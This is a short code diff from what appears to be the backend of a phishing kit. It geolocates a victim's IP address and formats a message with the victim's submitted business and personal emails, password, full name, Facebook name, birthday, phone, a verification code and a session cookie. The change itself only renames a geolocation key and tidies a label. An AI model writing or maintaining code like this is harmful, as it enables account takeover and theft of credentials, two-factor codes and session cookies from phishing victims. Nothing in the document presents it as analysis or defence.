@@ -34,7 +34,7 @@ def get_geolocation(public_ip):
             "country_code": country_code,
             "city": city,
             "latitude": latitude,
-            "longitude": longitude
+            "longtitude": longitude
         }
         return response_data
     except Exception as e:
@@ -50,7 +50,7 @@ def process(request):
         final_data['public_ip'] = public_ip
         final_data.update(geolocation)
         print(final_data)
-        message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n*Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\nCookie: {}'.format(
+        message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n*Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\n*Cookie*: {}'.format(
             datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
             final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
             final_data.get('longtitude', ''),
